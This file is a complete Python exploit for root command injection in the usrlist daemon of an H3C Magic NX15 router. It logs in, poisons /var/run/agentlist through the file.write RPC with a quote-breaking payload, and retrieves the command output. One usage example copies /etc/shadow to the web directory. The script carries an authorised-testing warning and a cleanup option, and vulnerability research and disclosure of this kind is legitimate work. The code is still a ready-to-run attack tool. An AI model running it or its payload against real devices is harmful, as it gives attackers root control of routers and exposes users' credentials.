#!/usr/bin/env python3
"""H3C Magic NX15 V100R017 — post-auth root command injection via usrlist.

Affected:  NX15V100R017  (/usr/bin/usrlist, function sub_416874)
Type:      CWE-78 OS Command Injection
Impact:    remote command execution as root
CVSS 3.1:  AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H  (7.2)

The daemon /usr/bin/usrlist interpolates each line of /var/run/agentlist into a
shell command *inside a pair of double quotes* and runs it with popen():

    snprintf(v10, 1024,
        "cat %s | grep -E \"%s\" | awk '{print $3}'",   /* format @0x41ED98 */
        "/tmp/mac_table.txt", v8);                      /* 0x416d14 */
    v6 = popen(v10, "r");                               /* 0x416d2c  sink */

A single `"` in a line closes the quoting and lets the attacker append commands.
usrlist reads the file from a 1-second timer callback, so execution is automatic
and repeats.

This tool writes the line through the authenticated RPC method
POST /api/esps -> file.write. That path's input filter
(FCGI_CheckStringIfContainsSemicolon_Esps) rejects only the single-quote byte
0x27, so `"` `;` `$` `|` `>` all pass.

!!!  For authorised testing only.  Running this against a device you do not own
!!!  or have written permission to test is illegal.  Prefer --dry-run first.

Usage
-----
    # show the payload and the exact shell line, change nothing
    python3 postauth_usrlist_cmdi_root_rce.py --target http://192.168.124.1 \
        --user H3C --password '<admin>' --dry-run

    # non-destructive proof: run `id`, redirect to the web dir, read it back
    python3 postauth_usrlist_cmdi_root_rce.py --target http://192.168.124.1 \
        --user H3C --password '<admin>' --verify-http

    # run an arbitrary command (redirect its output yourself)
    python3 postauth_usrlist_cmdi_root_rce.py --target http://192.168.124.1 \
        --user H3C --password '<admin>' \
        --cmd 'cat /etc/shadow>/www/download/o.txt' --verify-http

    # remove the poisoned line and the artefacts
    python3 postauth_usrlist_cmdi_root_rce.py --target http://192.168.124.1 \
        --user H3C --password '<admin>' --cleanup
"""
from __future__ import annotations

import argparse
import http.client
import json
import sys
import time
from urllib.parse import urlsplit

AGENTLIST = "/var/run/agentlist"
WWW_OUT = "/www/download/usrlist_poc.txt"
WEB_OUT = "/download/usrlist_poc.txt"


class NX15:
    def __init__(self, base: str, timeout: float = 25.0):
        p = urlsplit(base)
        self.host = p.hostname or "192.168.124.1"
        self.port = p.port or (443 if p.scheme == "https" else 80)
        self.timeout = timeout
        self.session: str | None = None

    def _req(self, method: str, path: str, body: bytes | None = None):
        c = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
        try:
            h = {"Host": self.host, "Content-Type": "application/json"}
            if self.session:
                h["AUTHENTICATION"] = self.session
            c.request(method, path, body=body, headers=h)
            r = c.getresponse()
            return r.status, r.read(1 << 20).decode("utf-8", "replace")
        finally:
            c.close()

    def login(self, user: str, password: str) -> bool:
        body = json.dumps({"username": user, "password": password}).encode()
        st, txt = self._req("POST", "/api/login/auth", body)
        tail = txt.split("\r\n\r\n")[-1].strip()
        try:
            self.session = json.loads(tail)["data"]["session"]
            return True
        except Exception:
            print(f"[!] login failed: HTTP {st} {tail[:160]}", file=sys.stderr)
            return False

    def write(self, path: str, data: str) -> dict:
        body = json.dumps([{"id": 1, "object": "file", "method": "write",
                            "param": {"path": path, "data": data}}]).encode()
        st, txt = self._req("POST", "/api/esps", body)
        try:
            return json.loads(txt)[0]
        except Exception:
            return {"result": {"code": None, "raw": txt[:200]}}

    def read(self, path: str) -> str | None:
        body = json.dumps([{"id": 1, "object": "file", "method": "read",
                            "param": {"path": path}}]).encode()
        st, txt = self._req("POST", "/api/esps", body)
        try:
            return json.loads(txt)[0]["result"].get("data")
        except Exception:
            return None

    def http_get(self, path: str):
        c = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
        try:
            c.request("GET", path, headers={"Host": self.host})
            r = c.getresponse()
            return r.status, r.read(1 << 20)
        finally:
            c.close()


def build_line(cmd: str) -> str:
    """One injection line.

    The trailing NEWLINE IS REQUIRED. sub_416874 does
        v10[strlen(v10) - 1] = 0;      /* strip trailing newline */
    Without it the last character of the payload is stripped instead, leaving
    `echo "` unterminated: the command line becomes a syntax error and nothing
    runs (silent failure).

    Resulting shell line:
      cat /tmp/mac_table.txt | grep -E "x";<cmd>;echo "y|" | awk '{print $3}'
    """
    return f'x";{cmd};echo "y\n'


def main() -> int:
    ap = argparse.ArgumentParser(
        description="NX15 usrlist post-auth root command injection (PoC)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__)
    ap.add_argument("--target", default="http://192.168.124.1")
    ap.add_argument("--user", default="H3C")
    ap.add_argument("--password", required=False, default="")
    ap.add_argument("--cmd", default=None,
                    help="command to run (redirect its output yourself)")
    ap.add_argument("--dry-run", action="store_true",
                    help="print payload and exit without sending anything")
    ap.add_argument("--verify-http", action="store_true",
                    help=f"read the result back over HTTP ({WEB_OUT})")
    ap.add_argument("--verify-file", action="store_true",
                    help="read the result back via the file.read RPC")
    ap.add_argument("--out", default=WWW_OUT,
                    help=f"output path used by the default proof ({WWW_OUT})")
    ap.add_argument("--wait", type=float, default=9.0,
                    help="seconds to wait for the timer (default 9)")
    ap.add_argument("--cleanup", action="store_true",
                    help="remove the poisoned line and the artefact")
    args = ap.parse_args()

    cmd = args.cmd or f"id>{args.out}"
    line = build_line(cmd)
    shell = ('cat /tmp/mac_table.txt | grep -E "x";' + cmd +
             ';echo "y|" | awk \'{print $3}\'')

    print(f"[*] injection line : {line!r}")
    print(f"[*] executed shell : {shell}")

    if args.dry_run:
        print("[*] --dry-run: nothing sent.")
        return 0

    if not args.password:
        print("[!] --password is required unless --dry-run is used", file=sys.stderr)
        return 2

    nx = NX15(args.target)
    if not nx.login(args.user, args.password):
        return 2
    print(f"[*] logged in to {args.target} (session {nx.session})")

    if args.cleanup:
        nx.write(AGENTLIST, "")
        time.sleep(args.wait)
        nx.write(args.out, "")
        nx.write("/tmp/inj_parent", "")
        print("[*] agentlist :", repr(nx.read(AGENTLIST)))
        print("[*] artefact  :", repr(nx.read(args.out)))
        return 0

    r = nx.write(AGENTLIST, line)
    code = (r.get("result") or {}).get("code")
    if str(code).startswith("21"):
        print(f"[!] payload rejected by the input filter: {r}")
        return 1
    print(f"[*] wrote {AGENTLIST}; waiting {args.wait}s for the timer ...")
    time.sleep(args.wait)

    ok = False
    if args.verify_file:
        v = nx.read(args.out)
        print(f"[*] file.read {args.out} -> {v!r}")
        ok = bool(v)
    if args.verify_http:
        st, body = nx.http_get(WEB_OUT if args.out == WWW_OUT else "/download/" +
                               args.out.rsplit("/", 1)[-1])
        print(f"[*] GET {WEB_OUT} -> HTTP {st} {body[:200]!r}")
        ok = ok or (st == 200 and len(body) > 0)

    if ok:
        print("\n[+] CONFIRMED: command executed as root, output retrieved.")
        return 0
    print("\n[-] no output retrieved. Check that usrlist is running "
          "(it is respawned by procd) and that the output path is writable.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
